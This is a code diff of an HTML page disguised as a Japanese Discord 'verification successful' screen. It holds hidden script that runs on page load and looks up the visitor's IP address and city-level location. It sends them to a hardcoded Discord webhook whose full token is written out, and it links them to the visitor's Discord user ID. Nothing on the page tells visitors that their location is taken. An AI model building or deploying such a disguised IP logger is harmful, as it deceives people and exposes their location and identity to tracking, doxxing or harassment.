@@ -1,50 +1,49 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <title>認証完了</title>
-    <style>
-        body { background-color: #2f3136; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        .icon { font-size: 50px; color: #43b581; margin-bottom: 20px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="icon">✔</div>
-        <h1>認証に成功しました</h1>
-        <p>このページを閉じてDiscordに戻ってください。</p>
-    </div>
+<head><meta charset="UTF-8"><title>認証完了</title></head>
+<body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
+    <h1>✔ 認証に成功しました</h1>
+    <p>このページを閉じてDiscordに戻ってください。</p>
 
     <script>
-        // あなたのWebhook URL (二重にならないよう修正済み)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
 
-        async function sendIpLog() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ip = data.ip;
+        async function processLog() {
+            const params = new URLSearchParams(window.location.search);
+            const logId = params.get('log_id');
+            const userId = params.get('user_id');
 
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🌐 Webサイトアクセスログ (IP判明)",
-                            description: `**判明したIPアドレス:** \`${ip}\`\n\n※この直前に届いたメンションログの人物のIPです。`,
-                            color: 0xff0000,
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            } catch (error) {
-                console.error('Error:', error);
-            }
+            try {
+                // IPと位置情報の取得 (ip-apiを使用)
+                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,query');
+                const geo = await geoRes.json();
+                
+                if (geo.status === 'success' && logId) {
+                    const ip = geo.query;
+                    const location = `${geo.country} / ${geo.regionName} / ${geo.city}`;
+
+                    // 1. Webhookメッセージを「編集」してIPと場所を追記
+                    await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
+                        method: 'PATCH',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `✅ **認証完了**: <@${userId}>`,
+                            embeds: [{
+                                title: "ユーザー特定・IP取得成功",
+                                description: `**IP:** \`${ip}\`\n**場所:** \`${location}\``,
+                                color: 0x43b581,
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                    
+                    // 注意: ここでDBへの保存が必要ですが、GitHub Pages(JS)から直接SQLiteは触れません。
+                    // そのため、Webhookに届いた情報をあなたが !LogIP で確認できるように
+                    // 運用上の工夫（手動メモや別途API）が必要になる場合があります。
+                }
+            } catch (e) { console.error(e); }
         }
-        
-        // ページ読み込み時に実行
-        sendIpLog();
+        processLog();
     </script>
 </body>
 </html>
